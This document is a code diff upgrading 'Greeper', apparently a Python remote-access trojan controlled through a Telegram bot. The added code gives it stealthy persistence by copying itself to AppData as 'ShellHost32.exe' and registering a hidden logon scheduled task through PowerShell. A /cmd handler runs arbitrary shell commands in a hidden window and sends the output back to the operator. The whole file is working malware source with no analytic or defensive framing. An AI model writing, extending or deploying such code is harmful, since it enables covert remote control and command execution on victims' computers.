@@ -1,8 +1,10 @@
-#GREEPER V1.1
+#GREEPER V1.2
 
 import os
+import sys
+import shutil
+import time
 import subprocess as sp
-from sys import exit
 try:import telebot
 except:os.system("pip install telebot")
 
@@ -11,41 +13,89 @@ user = "YOUR_USER_ID"
 
 bot.send_message(user,"Greeper is online!\nSend /help for help")
 
+@bot.message_handler(commands=['persistent'])
+def persistent(msg):
+    if msg.from_user.id != int(user):
+        bot.send_message(msg.chat.id, "You don't have permission!")
+        return
+    paypath=os.path.expanduser("~")+"\\AppData\\Roaming\\Microsoft\\AddIns\\ShellHost32.exe"
+    persistent_cmd = f"""$taskName='ShellHost32';if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){{Unregister-ScheduledTask -TaskName $taskName -Confirm:$false}};$action=New-ScheduledTaskAction -Execute '{paypath}';$trigger=New-ScheduledTaskTrigger -AtLogOn;$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -MultipleInstances Parallel;if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){{$principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest}}else{{$principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive}};Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Settings $settings"""
+    if os.path.isfile(paypath):
+        bot.send_message(msg.chat.id, "Persistence already exists!")
+    else:
+        shutil.copyfile(sys.executable, paypath)
+        sp.Popen(['powershell', '-command', persistent_cmd], creationflags=sp.CREATE_NO_WINDOW)
+        bot.send_message(user, "Persistence Added Sucessfully!")
+        bot.send_message(user,"Greeper will run on every System boot!")
+
+@bot.message_handler(commands=['uninstall'])
+def uninstall(msg):
+    if msg.from_user.id != int(user):
+        bot.send_message(msg.chat.id, "You don't have permission!")
+        return
+    paypath=os.path.expanduser("~")+"\\AppData\\Roaming\\Microsoft\\AddIns\\ShellHost32.exe"
+    uns_cmd=f"""$taskName='ShellHost32';if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){{Unregister-ScheduledTask -TaskName $taskName -Confirm:$false}}"""
+    if os.path.isfile(paypath):
+        sp.Popen(['powershell', '-command', uns_cmd], creationflags=sp.CREATE_NO_WINDOW)
+        try:
+            os.remove(paypath)
+        except:
+            try:
+                sp.Popen(['powershell', '-command', 'Remove-Item -Path "' + paypath + '" -Force'], creationflags=sp.CREATE_NO_WINDOW)
+            except Exception as e:
+                bot.send_message(msg.chat.id, "Error while removing persistence!\n\n" + str(e))
+                print(e)
+                return
+
+        bot.send_message(msg.chat.id, "Persistence Uninstalled Successfully!")
+    else:
+        bot.send_message(msg.chat.id, "Persistence not found!")
+
 @bot.message_handler(commands=["cmd"])
 def cmd(msg):
-    cmd = msg.text.partition(" ")[2]
-    if cmd != "":
-        try:
-            if cmd.startswith("cd"):
-                cmd = cmd.partition(" ")[2]
-                if cmd == "":
-                    bot.send_message(msg.chat.id, os.getcwd())
+    if msg.from_user.id == int(user):
+        cmd = msg.text.partition(" ")[2]
+        if cmd != "":
+            try:
+                if cmd.startswith("cd"):
+                    cmd = cmd.partition(" ")[2]
+                    if cmd == "":
+                        bot.send_message(msg.chat.id, os.getcwd())
+                    else:
+                        os.chdir(cmd)
+                        bot.send_message(msg.chat.id, os.getcwd())
                 else:
-                    os.chdir(cmd)
-                    bot.send_message(msg.chat.id, os.getcwd())
-            else:
-                os.system(cmd)
-                result = sp.Popen(cmd, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,text=True, creationflags=sp.CREATE_NO_WINDOW)
-                out, err = result.communicate()
-                result.wait()
-                if not err:
-                    if out: bot.send_message(msg.chat.id, out)
-                    else: bot.send_message(msg.chat.id, "Command executed sucessfully without Output!")
-                else:
-                    bot.send_message(msg.chat.id, err)
-        except Exception as e:
-            bot.send_message(msg.chat.id, "Some error occured!\n\n"+str(e))
+                    result = sp.Popen(cmd, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,text=True, creationflags=sp.CREATE_NO_WINDOW)
+                    out, err = result.communicate()
+                    result.wait()
+                    if not err:
+                        if out: bot.send_message(msg.chat.id, out)
+                        else: bot.send_message(msg.chat.id, "Command executed sucessfully without Output!")
+                    else:
+                        bot.send_message(msg.chat.id, err)
+            except Exception as e:
+                bot.send_message(msg.chat.id, "Some error occured!\n\n"+str(e))
+        else:
+            bot.send_message(msg.chat.id, "Parameter required!")
     else:
-        bot.send_message(msg.chat.id, "Parameter required!")
+        bot.send_message(msg.chat.id, "You don't have permission!")
 
 @bot.message_handler(commands=['terminate'])
 def terminate(message):
+    if message.from_user.id != int(user):
+        bot.send_message(message.chat.id, "You don't have permission!")
+        #return
     bot.send_message(user,"Greeper is offline!")
+    global end
+    end=True
     bot.stop_polling()
-    exit()
+    sys.exit()
 
 @bot.message_handler(commands=['msg'])
 def msg(message):
+    if message.from_user.id != int(user):
+        bot.send_message(message.chat.id, "You don't have permission!")
+        return
     message_content = ' '.join(message.text.split()[1:]).replace("'", "''")
     if message_content == "":
         bot.reply_to(message,"Empty Message!")
@@ -85,11 +135,20 @@ Commands:
                  
 1. /cmd <command> - Execute cmd/ps commands
 2. /msg <message to display> - displays msg box
-3. /terminate - Terminate current session
-4. /help - Displays this message
+3. /persistent - Auto starts Greeper on Boot!
+4. /uninstall - Uninstalls persistence
+5. /terminate - Terminate current session
+6. /help - Displays this message
                  
 Replace <> with parameters
 Ex: /cmd dir
 """)
 
-bot.polling(non_stop=True)
+end=False
+while not end:
+    try:
+        bot.polling(none_stop=True, timeout=60)
+        print("Greeper is running!")
+    except Exception as e:
+        print(f"Error: {e}")
+        time.sleep(5)
